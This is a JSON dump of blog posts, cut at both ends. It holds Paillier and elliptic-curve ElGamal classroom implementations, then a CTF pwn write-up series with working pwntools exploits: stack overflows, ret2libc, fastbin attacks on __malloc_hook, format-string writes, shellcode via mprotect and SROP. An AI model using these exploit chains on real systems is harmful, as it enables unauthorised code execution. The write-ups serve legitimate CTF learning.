else: return x % m def quick_pow(a, b, p): ret = 1 a %= p while b: if b\u0026amp;1: ret = (ret * a) % p b \u0026gt;\u0026gt;= 1 a = (a * a) % p return ret random.seed() lamb = lcm(p-1, q-1) mu = -1 while mu == -1: g = random.randint(0, n2-1) mu = modinv(L(quick_pow(g,lamb,n2)), n) print(\u0026#39;PubKey: (n={},g={})\u0026#39;.format(n,g)) print(\u0026#39;PrivKey: (lambda={},p={},q={})\u0026#39;.format(lamb,p,q)) print(\u0026#39;mu: {}\u0026#39;.format(mu)) r1 = random.randint(0,n-1) r2 = random.randint(0,n-1) c1 = quick_pow(g,m1,n2) * quick_pow(r1,n,n2) % n2 c2 = quick_pow(g,m2,n2) * quick_pow(r2,n,n2) % n2 print(\u0026#39;c1: {}\u0026#39;.format(c1)) print(\u0026#39;c2: {}\u0026#39;.format(c2)) m1_ = L(quick_pow(c1,lamb,n2)) * mu % n m2_ = L(quick_pow(c2,lamb,n2)) * mu % n print(\u0026#34;m1\u0026#39;: {}\u0026#34;.format(m1_)) print(\u0026#34;m2\u0026#39;: {}\u0026#34;.format(m2_)) m_ = L(quick_pow(c1*c2,lamb,n2)) * mu % n print(\u0026#34;m\u0026#39;: {}\u0026#34;.format(m_)) ","date":"2019-12-26","permalink":"/posts/paillier/","section":"Posts","summary":"\u003cp\u003e最后一次抽代课的上机练习。\u003c/p\u003e","title":"Paillier 同态加密方案实现"},{"content":"抽代课的上机练习。\n方案简述 # 设 $E$ 为 $F_q$ 上的椭圆曲线，一般记为 $E(F_q)$，设 $P=(x_p,y_p)\\in E(F_q)$，且 $P$ 的次数足够大， 任取 $1\u0026lt;s\u0026lt;ord(P)$，令 $Q=(x_q,y_q)=sP$，则 $(E(F_q),P,Q)$ 为公钥，$s$ 为私钥。 消息 $m$ 满足 $0\\leq m\u0026lt;F_q$，任取 $1\u0026lt;r\u0026lt;F_q$，计算 $(x_1,y_1)=𝑟𝑃,(x_2,y_2)=rQ,c=m\\cdot x_2$， 则密文为 $(x_1,y_1,c)$。 解密时，计算 $(x\u0026rsquo;,y\u0026rsquo;)=s(x_1,y_1)$，再计算 $m\u0026rsquo;=c\\cdot x\u0026rsquo;^{-1}$，解得明文。 正确性证明 # 因为 $(x\u0026rsquo;,y\u0026rsquo;)=s(x_1,y_1)=srP=rsP=rQ=(x_2,y_2)$，所以 $x\u0026rsquo;=x_2$， 因此 $m\u0026rsquo;=c\\cdot x\u0026rsquo;^{-1}=c\\cdot x_2^{-1}=m$，得证。 方案的安全性依赖于椭圆曲线上的离散对数问题。 练习内容 # 令 $E:y^2=x^3+x+6$ 为 $F_{11}$ 上的一条椭圆曲线，求 $E$ 上的所有点 令 $P=(2,7)$，取 $s=5$，求公钥 设消息 $m=3$，取 $r=7$，求 $m$ 的密文 $(x_1,y_1,c)$ 对 $(x_1,y_1,c)$ 做解密运算，求 $(x\u0026rsquo;,y\u0026rsquo;)$，并进一步求其明文 $m'$ 代码 # $F_{11}$ 比较小就直接硬编码了，也可以利用 模 p 平方根算法 来求解二次剩余对应的平方根。\n需要注意的地方是不要对负数求逆元，因此做减法时可以额外加一个 +p。\n# general funcs def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(\u0026#39;Modular inverse does not exist\u0026#39;) else: return x % m # constants p = 11 a,b,c,d = 1,0,1,6 # y^2 = ax^3 + bx^2 + cx + d sqrt = [-1,1,-1,5,2,4,-1,-1,-1,3,-1] def E(x): return (a*x**3 + b*x**2 + c*x + d) % p # dy/dx def dE(x, y): return (3*a*x**2 + 2*b*x + c) * modinv(2*y, p) def add(P, Q): x1,y1,x2,y2 = P[0],P[1],Q[0],Q[1] if x1==x2 and y1==y2: K = dE(x1,y1) else: K = (y2-y1) * modinv(x2-x1+p, p) x0 = (K**2 - x1 - x2) % p y0 = (K * (x1 - x0) - y1) % p return (x0, y0) def mul(P, x): Q = P for i in range(x-1): Q = add(Q, P) return Q def init(): for i in range(p): y2 = E(i) print(\u0026#39;x={}, y^2={}\u0026#39;.format(i, y2), end=\u0026#39;\u0026#39;) if sqrt[y2] != -1: print((i, sqrt[y2]), (i, p-sqrt[y2])) else: print() init() P = (2,7) s = 5 Q = mul(P,s) # Q = sP Estr = \u0026#39;{}x^3 + {}x^2 + {}x + {}\u0026#39;.format(a,b,c,d) print(\u0026#39;Pubkey: ({},{},{})\u0026#39;.format(Estr,P,Q)) m = 3 r = 7 c1 = mul(P,r) # (x1,y1) c2 = mul(Q,r) # (x2,y2) C = m * c2[0] % p print(\u0026#39;Ciphertext: {}\u0026#39;.format(c1+(C,))) # (x1,y1,C) C_ = mul(c1,s) # (x\u0026#39;,y\u0026#39;) print(\u0026#34;(x\u0026#39;,y\u0026#39;): {}\u0026#34;.format(C_)) m_ = C * modinv(C_[0],p) % p # C * (x\u0026#39;)^(-1) print(\u0026#39;Plaintext: {}\u0026#39;.format(m_)) ","date":"2019-12-20","permalink":"/posts/elgamal-ecc/","section":"Posts","summary":"\u003cp\u003e抽代课的上机练习。\u003c/p\u003e","title":"ElGamal 密码方案的椭圆曲线形式实现"},{"content":"从今天起，我也是 Pwn 🐕 了。\nPart I # test_your_nc # nc 直接连，cat flag。\nrip # 栈溢出，可直接覆盖返回地址，注意 64 位：\npayload = \u0026#39;a\u0026#39;*(0xf+8) + p64(elf.symbols[\u0026#39;fun\u0026#39;]) s(payload) warmup_csaw_2016 # 和上题其实一样，程序中存在后门，直接返回过去。\npayload = \u0026#39;a\u0026#39;*(0x40+8) + p64(0x40060d) s(payload) pwn1_sctf_2016 # 直接运行几次或者源码审计可以发现是将输入的 I 替换为 you，其余的其实和上面一样：\npayload = \u0026#39;I\u0026#39;*(0x3c // 3)+\u0026#39;a\u0026#39;*4+p32(elf.symbols[\u0026#39;get_flag\u0026#39;]) sl(payload) ciscn_2019_c_1 # 开启了 NX 保护，并且有未限制长度的 gets，基本上可以确定是 ROP 栈溢出。IDA 搜一下 string，可以发现有 libc 可以用，考虑 ret2libc。\npop_rdi = 0x400c83 def send(payload): ru(\u0026#39;!\\n\u0026#39;) sl(\u0026#39;1\u0026#39;) ru(\u0026#39;ed\\n\u0026#39;) sl(payload) payload = flat(\u0026#39;a\u0026#39;*0x58,pop_rdi,elf.got[\u0026#39;__libc_start_main\u0026#39;],elf.plt[\u0026#39;puts\u0026#39;],elf.sym[\u0026#39;main\u0026#39;]) send(payload) ru(\u0026#39;@\\n\u0026#39;) leak = uu64(r(6)) system,binsh = ret2libc(leak,\u0026#39;__libc_start_main\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*0x58,pop_rdi,binsh,system) send(payload) ciscn_2019_n_1 # 依然是最简单的无保护 gets 并且程序中有 system(\u0026quot;cat /flag\u0026quot;)，找到后者地址返回过去即可。\ncat_flag = 0x4006be def send(payload): ru(\u0026#39;number.\\n\u0026#39;) sl(payload) payload = flat(\u0026#39;a\u0026#39;*0x38, cat_flag) send(payload) ciscn_2019_en_2 # 和上上题一样。\nPart II # [OGeek2019]babyrop # int __cdecl main() { int buf; // [esp+4h] [ebp-14h] char v2; // [esp+Bh] [ebp-Dh] int fd; // [esp+Ch] [ebp-Ch] sub_80486BB(); fd = open(\u0026#34;/dev/urandom\u0026#34;, 0); if (fd\u0026gt; 0 ) read(fd, \u0026amp;buf, 4u); v2 = sub_804871F(buf); sub_80487D0(v2); return 0; } main 中 sub_80486BB 用于初始化，然后将一个随机数传入 sub_804871F：\nint __cdecl sub_804871F(int a1) { size_t v1; // eax char s; // [esp+Ch] [ebp-4Ch] char buf[7]; // [esp+2Ch] [ebp-2Ch] unsigned __int8 v5; // [esp+33h] [ebp-25h] ssize_t v6; // [esp+4Ch] [ebp-Ch] memset(\u0026amp;s, 0, 0x20u); memset(buf, 0, 0x20u); sprintf(\u0026amp;s,\u0026#34;%ld\u0026#34;, a1); v6 = read(0, buf, 0x20u); buf[v6 - 1] = 0; v1 = strlen(buf); if (strncmp(buf, \u0026amp;s, v1) ) exit(0); write(1,\u0026#34;Correct\\n\u0026#34;, 8u); return v5; } 这里的 a1 就是传入的随机数，然后要求我们的输入和随机数经过 strncmp 比较后完全相同，我们可以输入 \\x00 使得 strlen 函数返回 0，从而使得 strncmp 函数只比较 0 个字节，那么就能绕过这里的 exit(0)，并返回 v5。注意到这里的返回值 v5 在 ebp-0x25，距离我们能控制的位于 ebp-0x2c 的变量 buf 相差 0x7，小于这里 read 的长度限制 0x20，因此可以通过栈溢出控制 v5 的值，从而控制 main 中的 v2。\n随后，v2 会被传入 sub_80487D0:\nssize_t __cdecl sub_80487D0(char a1) { ssize_t result; // eax char buf; // [esp+11h] [ebp-E7h] if (a1 == 127) result = read(0, \u0026amp;buf, 0xC8u); else result = read(0, \u0026amp;buf, a1); return result; } a1 就是我们可以控制的 v2，也就是说这里可以向 buf 写入的数据长度也是我们能控制的，那么我们希望它尽可能大，也就是等于 0xff。那么在上一个函数中我们就需要令 v5 为 0xff，结合上面的绕过，可以输入 '\\x00' + 6*'a' + '\\xff' 来达到这个目的。最后 ret2libc 即可。\ndef send1(): payload = flat(\u0026#39;\\x00\u0026#39;,\u0026#39;a\u0026#39;*6,\u0026#39;\\xff\u0026#39;) sl(payload) ru(\u0026#39;Correct\\n\u0026#39;) send1() main = 0x8048825 payload = flat(\u0026#39;a\u0026#39;*(0xe7+4),elf.plt[\u0026#39;write\u0026#39;],main,1,elf.got[\u0026#39;__libc_start_main\u0026#39;],4) sl(payload) leak = u32(r(4)) system,binsh = ret2libc(leak,\u0026#39;__libc_start_main\u0026#39;) send1() payload = flat(\u0026#39;a\u0026#39;*(0xe7+4),system,\u0026#39;a\u0026#39;*4,binsh) p.sendline(payload) babyheap_0ctf_2017 # ===== Baby Heap in 2017 ===== 1. Allocate 2. Fill 3. Free 4. Dump 5. Exit 分配内存使用了 calloc，每次分配会先清空一下这块内存，大小限制是 4096B。填充时直接读取用户输入，没有检查长度，因此可以堆溢出。除了 canary 外保护全开，因此考虑泄露 libc。如何泄露？\n当只有一个 small bin/large bin 被释放时，其 fd 与 bk 指向 main_arena 中的地址，而后者是 libc 的一个全局变量，因此可以通过它泄露出 libc 基址。\n首先分配 4 个 fast chunk 和 1 个 small chunk（不妨分别称为 a,b,c,d,e），然后释放 b，它将被加入 fast bin 顶部。此时再释放 c，那么 c 也会加入 fast bin 顶部，并且它的 fd 指向 b。此时有：freelist-\u0026gt;c-\u0026gt;b。\nfor i in range(4): alloc(0x10) # a0,b1,c2,d3 alloc(0x80) # e4 free(1) # b free(2) # c 这样就可以进行 fastbin attack。利用 Fill 堆溢出修改 c 的 fd 为 e 的地址（我们需要从未被释放的 a 开始填充，所以刚才不是从 a 开始释放），随后第一次 Allocate 拿到 c，第二次 Allocate 就能拿到 e。\n# c-\u0026gt;fd = e payload = flat([0,0,0,0x21,0,0,0,0x21,\u0026#39;\\x80\u0026#39;]) fill(0, payload) 注意这里 payload 的前三个 0 用于填充 a 中 0x10 字节的用户数据和 b 中 0x8 字节的 prev_size 字段，后面同理。0x21 是 a/b/c/d 的 chunk_size，0x80 是 e 的地址低 8 位，都可以通过 gdb 调试得到。\n注：0x21 低位的 1 表示 PREV_INUSE，这和 fast bin 中 chunk 的 P 位不变是一致的。\n然而这里存在一个安全检查：\n#define fastbin_index(sz) \\ ((((unsigned int) (sz)) \u0026gt;\u0026gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \u0026#34;malloc(): memory corruption (fast)\u0026#34;; errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL; } 检查我们拿到的 chunk 的大小是否在对应索引的 fast bin 范围内。所以我们还需要修改 e 的 chunk_size 字段，方法同样是堆溢出。\n# e-\u0026gt;chunk_size = 0x21 payload = flat([0,0,0,0x21]) fill(3, payload) 这里通过 d 溢出到 e 的 chunk_size 并覆盖上了 0x21，gdb 调试得到其索引为 2。\n修改完成后才可以进行两次 alloc(0x10) 从而拿到 e。拿到 e 后再释放掉它就可以获得其 fd 与 bk，但这里有两个问题：\n前面对其 chunk_size 的修改会导致释放时 e 进入 fast bin，拿不到 fd 和 bk。 e 被释放后与 top chunk 相邻，必定会被合并。 fd 和 bk 到底指向哪里？ 解答：\n把 e 的 chunk_size 恢复即可。 释放 e 前再多申请一个 small chunk 使得 e 不与 top chunk 相邻。 e 被释放后进入 unsorted bin，所以其 fd 与 bk 都指向 unsorted bin 的链表头，注意其地址到 libc 基址的偏移是固定的 0x3c4b78。 # e-\u0026gt;chunk_size = 0x91 payload = flat([0,0,0,0x91]) fill(3, payload) alloc(0x80) # f5 free(4) # e, e-\u0026gt;fd = unsorted_head base = u64(dump(2)[:8])-0x3c4b78 最后的 dump(2) 就是打印索引为 2 的 chunk，也就是 e，从而得到 e 的 fd 和 bk。\n之后，再次使用 fast bin attack 将 libc 中函数，例如 __malloc_hook 放入 fast bin，然后用 malloc 返回给我们，就可以实现类似 GOT 劫持的效果。__malloc_hook 只要非空，就会在 malloc 时被调用，我们让它指向 one_gadget 找到的一个 gadget 即可，比如可以用距离 libc 基址 0x4526a 的 gadget。\n但是同样的，我们需要绕过上面的安全检查。幸运的是，该检查对于对齐没有任何要求。通过 gdb 调试我们发现在 __malloc_hook 附近的 _IO_wide_data_0+304 位置其高位字节为 7f 而低位字节含有连续的 00，因此可以通过增加一些偏移获得 0x7f 这个数值作为 chunk_size，恰好能通过检查。\n如下：\npwndbg\u0026gt; x/32xg (long long)(\u0026amp;main_arena)-0x40 0x7f16d95deae0 \u0026lt;_IO_wide_data_0+288\u0026gt;: 0x0000000000000000 0x0000000000000000 0x7f16d95deaf0 \u0026lt;_IO_wide_data_0+304\u0026gt;: 0x00007f16d95dd260 0x0000000000000000 0x7f16d95deb00 \u0026lt;__memalign_hook\u0026gt;: 0x00007f16d929fe20 0x00007f16d929fa00 0x7f16d95deb10 \u0026lt;__malloc_hook\u0026gt;: 0x0000000000000000 0x0000000000000000 我们加 13 字节偏移（循环右移），成功伪造 chunk_size：\npwndbg\u0026gt; x/32xg (long long)(\u0026amp;main_arena)-0x40+0xd 0x7f16d95deaed \u0026lt;_IO_wide_data_0+301\u0026gt;: 0x16d95dd260000000 0x000000000000007f 0x7f16d95deafd: 0x16d929fe20000000 0x16d929fa0000007f 0x7f16d95deb0d \u0026lt;__realloc_hook+5\u0026gt;: 0x000000000000007f 0x0000000000000000 0x7f16d95deb1d: 0x0000000000000000 0x0000000000000000 0x7f 对应的 malloc 请求大小大约是 0x60。现在，freelist 顶部是 e，于是 alloc(0x60) 就会分配总大小为 0x71、起点与 e 相同、且索引为 4 的 chunk g，这时再 free 掉 g 就会使得 g 位于 freelist 顶部。\nalloc(0x60) # g4 free(4) # g 接下来修改索引为 2 的 chunk 的 fd（实际就是为了修改 e 或者说 g 的 fd）指向 _IO_wide_data_0+301 地址，然后第一次 Allocate 得到 g 位于索引 5，第二次 Allocate 得到指向 _IO_wide_data_0+301 的指针，位于索引 6。\n# g-\u0026gt;fd = _IO() payload = p64(base+0x3c4aed) fill(2, payload) alloc(0x60) # g5 alloc(0x60) # _IO()6 而由上面的 gdb 分析可知得到的指针位于 0xaed，__malloc_hook 位于 0xb10（PIE 下低 12 位固定），相差 0x13。因此填充 0x13 字节的 padding 后再放上 getshell 的 gadget 地址即可。\n# _IO() + 13 == __malloc_hook(), one_gadget payload = flat([\u0026#39;\\x00\u0026#39;*0x13, base+0x4526a]) fill(6, payload) 最后不要忘记再申请一次任意大小内存以调用 __malloc_hook。完整 exp，注意最后一次 alloc 返回得有点慢，recvuntil 最好加一个 timeout：\ndef alloc(size): sl(\u0026#39;1\u0026#39;) sla(\u0026#39;:\u0026#39;, str(size)) ru(\u0026#39;:\u0026#39;, timeout=1) def fill(idx, data): sl(\u0026#39;2\u0026#39;) sla(\u0026#39;:\u0026#39;, str(idx)) sla(\u0026#39;:\u0026#39;, str(len(data))) sa(\u0026#39;:\u0026#39;, data) ru(\u0026#39;:\u0026#39;) def free(idx): sl(\u0026#39;3\u0026#39;) sla(\u0026#39;:\u0026#39;, str(idx)) ru(\u0026#39;:\u0026#39;) def dump(idx): sl(\u0026#39;4\u0026#39;) sla(\u0026#39;:\u0026#39;, str(idx)) ru(\u0026#39;: \\n\u0026#39;) data = p.ru(\u0026#39;\\n\u0026#39;) ru(\u0026#39;:\u0026#39;) return data for i in range(4): alloc(0x10) # a0,b1,c2,d3 alloc(0x80) # e4 free(1) # b free(2) # c # c-\u0026gt;fd = e payload = flat(0,0,0,0x21,0,0,0,0x21,\u0026#39;\\x80\u0026#39;) fill(0, payload) # e-\u0026gt;chunk_size = 0x21 payload = flat(0,0,0,0x21) fill(3, payload) alloc(0x10) # c1 alloc(0x10) # e2 # e-\u0026gt;chunk_size = 0x91 payload = flat(0,0,0,0x91) fill(3, payload) alloc(0x80) # f5 free(4) # e, e-\u0026gt;fd = unsorted_head base = u64(dump(2)[:8])-0x3c4b78 leak(\u0026#39;libc_base\u0026#39;,base) alloc(0x60) # g4 free(4) # g # g-\u0026gt;fd = _IO() payload = p64(base+0x3c4aed) fill(2, payload) alloc(0x60) # g5 alloc(0x60) # _IO()6 # _IO() + 0x13 == __malloc_hook(), one_gadget payload = flat(\u0026#39;\\x00\u0026#39;*0x13,p64(base+0x4526a)) fill(6, payload) # malloc() -\u0026gt; __malloc_hook() alloc(1) get_started_3dsctf_2016 # 本地运行脚本：\nget_flag = 0x80489a0 payload = flat(\u0026#39;a\u0026#39;*0x38,get_flag,\u0026#39;a\u0026#39;*4,0x308cd64f,0x195719d1) sl(payload) print r() 本来这样是可以直接读取 flag 的，但是远程不行。因此远程运行时换了一种更具难度的方法，就是调用 mprotect 修改 bss 段权限使得其可执行，随后写入 shellcode。\n需要注意 mprotect 第二个参数要求页对齐，第三个参数为 7 表示 rwx。修改完成后从标准输入读入 shellcode，写入 bss_base 后返回到 bss_base 处执行。\npop3 = 0x80483b8 got_base = 0x80eb000 bss_base = elf.bss() payload = flat(\u0026#39;a\u0026#39;*0x38,elf.sym[\u0026#39;mprotect\u0026#39;],pop3,got_base,0x1000,7,elf.sym[\u0026#39;read\u0026#39;],pop3,0,bss_base,0x200,bss_base) sl(payload) sleep(1) sl(asm(shellcraft.sh())) not_the_same_3dsctf_2016 # 和上面 get_started 做法一样。我怀疑 BUU 上一题在服务器上放错了二进制文件，也放了这一题的，所以第一个脚本才会无效。\n[第五空间 2019 决赛]PWN5 # 长度限制无法栈溢出，但是存在明显的格式化字符串漏洞。通过 aaaa %08x %08x ... 可以判断偏移为 10。\n然后利用 %10$n 修改 0x804c044 地址（IDA 得到）处的值即可，最后输入 passwd 需要与已成功输出的字符数相等。当然，也可以直接修改 atoi 的 GOT 地址为 system 的 PLT 地址。\nsla(\u0026#39;:\u0026#39;, p32(0x804c044) + \u0026#39;%10$n\u0026#39;) sla(\u0026#39;:\u0026#39;, \u0026#39;4\u0026#39;) ciscn_2019_n_8 # IDA 可知需要让 var 的下标为 13 的元素（也就是第 14 个）等于 17，直接按照需求写脚本即可：\nsl(p32(17)*14) babyfengshui_33c3_2016 # 本题源码大致如下，开启了 canary 和 NX：\nvoid __cdecl __noreturn main() { char v0; // [esp+3h] [ebp-15h] int action; // [esp+4h] [ebp-14h] size_t input; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); alarm(0x14u); while (1) { puts(\u0026#34;0: Add a user\u0026#34;); puts(\u0026#34;1: Delete a user\u0026#34;); puts(\u0026#34;2: Display a user\u0026#34;); puts(\u0026#34;3: Update a user description\u0026#34;); puts(\u0026#34;4: Exit\u0026#34;); printf(\u0026#34;Action:\u0026#34;); if (__isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;action) == -1 ) break; if (!action) { printf(\u0026#34;size of description:\u0026#34;); __isoc99_scanf(\u0026#34;%u%c\u0026#34;, \u0026amp;input, \u0026amp;v0); add(input); } if (action == 1) { printf(\u0026#34;index:\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;input); delete((unsigned __int8)input); } if (action == 2) { printf(\u0026#34;index:\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;input); display((unsigned __int8)input); } if (action == 3) { printf(\u0026#34;index:\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;input); update(input); } if (action == 4) { puts(\u0026#34;Bye\u0026#34;); exit(0); } if ((unsigned __int8)total_users \u0026gt; 0x31u ) { puts(\u0026#34;maximum capacity exceeded, bye\u0026#34;); exit(0); } } exit(1); } 我们重点关注可能存在漏洞的 add 和 update，首先是 add：\n_DWORD *__cdecl add(size_t size) { void *desc; // ST24_4 _DWORD *user; // ST28_4 desc = malloc(size); memset(desc, 0, size); user = malloc(0x80u); memset(user, 0, 0x80u); *user = desc; users[(unsigned __int8)total_users] = user; printf(\u0026#34;name:\u0026#34;); read_name((char *)users[(unsigned __int8)total_users] + 4, 124); update(++total_users - 1); return user; } 这里可以大致了解到 user 结构体大约长这样：\nstruct user { char *description; char name[124]; }; 注意 descrption 是 user 开始的地方。\n随后发现 update 中存在一处防护措施：\nunsigned int __cdecl sub_8048724(unsigned __int8 index) { char v2; // [esp+17h] [ebp-11h] int len; // [esp+18h] [ebp-10h] unsigned int v4; // [esp+1Ch] [ebp-Ch] v4 = __readgsdword(0x14u); if (index \u0026lt; (unsigned __int8)total_users \u0026amp;\u0026amp; users[index] ) { len = 0; printf(\u0026#34;text length:\u0026#34;); __isoc99_scanf(\u0026#34;%u%c\u0026#34;, \u0026amp;len, \u0026amp;v2); if ((char *)(len + *(_DWORD *)users[index]) \u0026gt;= (char *)users[index] - 4 ) { puts(\u0026#34;my l33t defenses cannot be fooled, cya!\u0026#34;); exit(1); } printf(\u0026#34;text:\u0026#34;); read_name(*(_DWORD *)users[index], len + 1); } return __readgsdword(0x14u) ^ v4; } 这里其实是判断当前 user-\u0026gt;description 加上输入的字符串长度是否会超过 user 起始地址 - 4 的位置，目的很明显是为了防止堆溢出。预期内存布局是：\n-------- | Desc0 | -------- \u0026lt;- user0 | \u0026amp;Desc0 | -------- | name0 | -------- | Desc1 | -------- \u0026lt;- user1 | \u0026amp;Desc1 | -------- | name1 | -------- | Desc2 | -------- \u0026lt;- user2 | \u0026amp;Desc2 | -------- | name2 | -------- 然而，我们还拥有删除用户的功能。假如我们删除第 0 个用户，那么他拥有的空间就被 free() 了。这时我们新增用户，由于 desc 长度可控，我们可以控制其长度让它恰好分配到原来第 0 个用户的空间，从 Desc0 一直到 name0 结束。那么此时：\n-------- | | | | | Desc3 | | | | | -------- | Desc1 | -------- \u0026lt;- user1 | \u0026amp;Desc1 | -------- | name1 | -------- | Desc2 | -------- \u0026lt;- user2 | \u0026amp;Desc2 | -------- | name2 | -------- \u0026lt;- user3 | \u0026amp;Desc3 | -------- | name3 | -------- 不难发现，即使有上述防护措施的限制，我们依然可以溢出到 user1 并覆盖其中数据。如果把 libc 中函数的 GOT 表地址放进去，然后 display 函数打印出来，就能泄露 libc 地址。然后进行 GOT 劫持即可 getshell。\n需要注意的是，上图中 Desc1 前和 \u0026amp;Desc1 前都有 8 字节 chunk header，覆盖时需要考虑它们占的 16B。此外，Desc0+user0 原本所占的空间实际上是 0x8+0x80+0x8+0x80，而 Desc3 申请 0x100 字节时实际占 0x8+0x100，前者比后者多出空闲的 0x8 字节，也需要考虑。因此计算偏移 0x100+0x8+0x8+0x80+0x8=0x198。\n放上 0x198 字节的 padding 后，就可以把 free 的 GOT 地址放在 \u0026amp;Desc1 处，此时打印出来的就是 free 的 GOT 地址，从而泄露出 libc。这时再利用更新功能用 system.plt 覆盖 free.got，那么执行 free 时就会执行 system。此时还差一个参数 /bin/sh，我们不妨放在 Desc2 处，那么在删除 user2 时，有源码：\nunsigned int __cdecl delete(unsigned __int8 index) { unsigned int v2; // [esp+1Ch] [ebp-Ch] v2 = __readgsdword(0x14u); if (index \u0026lt; (unsigned __int8)total_users \u0026amp;\u0026amp; users[index] ) { free(*(void **)users[index]); free(users[index]); users[index] = 0; } return __readgsdword(0x14u) ^ v2; } 这里就会执行 free(address of /bin/sh)，实际上就是 system('/bin/sh')。\ndef add(max_len, desc_len, text): sla(\u0026#39;Action:\u0026#39;, \u0026#39;0\u0026#39;) sla(\u0026#39;description:\u0026#39;, str(max_len)) sla(\u0026#39;name:\u0026#39;, \u0026#39;aaaa\u0026#39;) sla(\u0026#39;length:\u0026#39;, str(desc_len)) sla(\u0026#39;text:\u0026#39;, text) def delete(index): sla(\u0026#39;Action:\u0026#39;, \u0026#39;1\u0026#39;) sla(\u0026#39;index:\u0026#39;, str(index)) def display(index): sla(\u0026#39;Action:\u0026#39;, \u0026#39;2\u0026#39;) sla(\u0026#39;index:\u0026#39;, str(index)) def update(index, desc_len, text): sla(\u0026#39;Action:\u0026#39;, \u0026#39;3\u0026#39;) sla(\u0026#39;index:\u0026#39;, str(index)) sla(\u0026#39;length:\u0026#39;, str(desc_len)) sla(\u0026#39;text:\u0026#39;, text) add(0x80,0x80,\u0026#39;a\u0026#39;*0x80) add(0x80,0x80,\u0026#39;b\u0026#39;*0x80) add(0x8,0x8,\u0026#39;/bin/sh\\x00\u0026#39;) delete(0) add(0x100,0x19c,\u0026#39;a\u0026#39;*0x198+p32(elf.got[\u0026#39;free\u0026#39;])) display(1) ru(\u0026#39;tion:\u0026#39;) free = u32(r(4)) leak(\u0026#39;free\u0026#39;,free) system,binsh = ret2libc(free,\u0026#39;free\u0026#39;) update(1,4,p32(system)) delete(2) ciscn_2019_s_3 # 本题代码很少，注意到 gadgets 函数中有 mov rax, 0Fh 和 mov rax, 3Bh 可以控制 rax，它们恰好分别对应系统调用 sigreturn 和 execve。因此本题可以围绕这两个系统调用给出两种做法。\n比较难的做法是利用 execve，我们希望执行 execve('/bin/sh',0,0)，那么还需要控制 rdi,rsi,rdx。这里需要几个 gadgets，但是 gadgets 函数中的不够用，所以可以 ret2csu。/bin/sh 需要我们自己写，但只能写到栈上，因此需要通过 write 泄露栈地址。\n我们输入的内容位于 rbp-0x10，那么填充 16 字节后填充 main 函数地址即可重启程序同时泄露栈地址，gdb 调试可知泄露位置距离我们的输入偏移量为 0x118 字节。\n最后在栈上布置好 /bin/sh 字符串和 pop_rdi 的 gadget，准备好 rax，返回到 csu 末尾确保 rbx=0 且 rbp=1，将栈上 pop rdi 的地址给 r12 以便调用，随后设置 rsi,rdx 为 0，最后将 /bin/sh 的地址给 rdi，调用 syscall 即可。\nsyscall = 0x400517 mov_rax_3b = 0x4004e2 pop_rdi = 0x4005a3 csu_1 = 0x400580 csu_2 = 0x40059a payload = \u0026#39;a\u0026#39;*16 + p64(elf.sym[\u0026#39;main\u0026#39;]) sl(payload) r(0x20) stack = uu64(r(8))-0x118 leak(\u0026#39;stack\u0026#39;,stack) payload = flat(\u0026#39;/bin/sh\\x00\u0026#39;,pop_rdi,mov_rax_3b,csu_2,0,1,stack-0x18,0,0,0,csu_1,pop_rdi,stack-0x20,syscall) sl(payload) 第二种方法则是 SROP。我们利用 mov rax, 0Fh 控制 rax 为 15，随后调用 syscall，相当于执行了一次 sigreturn。可以伪造 sigreturn frame 来执行 execve('/bin/sh',0,0)。\nsyscall = 0x400517 mov_rax_0f = 0x4004da payload = \u0026#39;a\u0026#39;*16 + p64(elf.sym[\u0026#39;vuln\u0026#39;]) sl(payload) r(0x20) stack = uu64(p.r(8))-0x118 leak(\u0026#39;stack\u0026#39;,stack) frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = stack frame.rsi = 0 frame.rdx = 0 frame.rsp = stack frame.rip = syscall payload = flat(\u0026#39;/bin/sh\\x00\u0026#39;*2,mov_rax_0f,syscall) + str(frame) sl(payload) [HarekazeCTF2019]baby_rop # 发现 main 里有 system，然后还找到了 /bin/sh 字符串和 pop rdi 的 gadget，那就老办法传参就行了，就是 getshell 之后需要找一下 flag 的位置。\nbinsh = 0x601048 pop_rdi = 0x400683 payload = flat(\u0026#39;a\u0026#39;*0x18,pop_rdi,binsh,elf.plt[\u0026#39;system\u0026#39;]) sl(payload) pwn2_sctf_2016 # 本题先会让用户设置读入数据长度，如果大于 32 则退出。由于它自己实现的 get_n 函数第二个参数是 unsigned int，很容易想到使用整数溢出来绕过这个限制，因此可以输入 -1 产生栈溢出漏洞。然后 ret2libc 就好。\nru(\u0026#39;read?\u0026#39;) sl(\u0026#39;-1\u0026#39;) ru(\u0026#39;data!\u0026#39;) you_said_s = 0x80486f8 payload = flat(\u0026#39;a\u0026#39;*(0x2c+4),elf.plt[\u0026#39;printf\u0026#39;],elf.sym[\u0026#39;main\u0026#39;],you_said_s,elf.got[\u0026#39;printf\u0026#39;]) sl(payload) ru(\u0026#39;You said:\u0026#39;) ru(\u0026#39;You said:\u0026#39;) printf = u32(r(4)) leak(\u0026#39;printf\u0026#39;,printf) system,binsh = ret2libc(printf,\u0026#39;printf\u0026#39;) ru(\u0026#39;read?\u0026#39;) sl(\u0026#39;-1\u0026#39;) ru(\u0026#39;data!\u0026#39;) payload = flat(\u0026#39;a\u0026#39;*(0x2c+4),system,\u0026#39;a\u0026#39;*4,binsh) sl(payload) ez_pz_hackover_2016 # 这题要求字符串 s 以 crackme\\x00 开头，随后会执行 memcpy 将我们的输入复制到一个 dest 位置。我们通过 gdb 调试可以测出其距离 ebp 距离为 22，要覆盖到返回地址则需要 26 字节。至于返回地址，题目提供了字符串 s 的地址，但是直接以它作为返回地址会失败，gdb 调试到 vuln 函数中的 ret 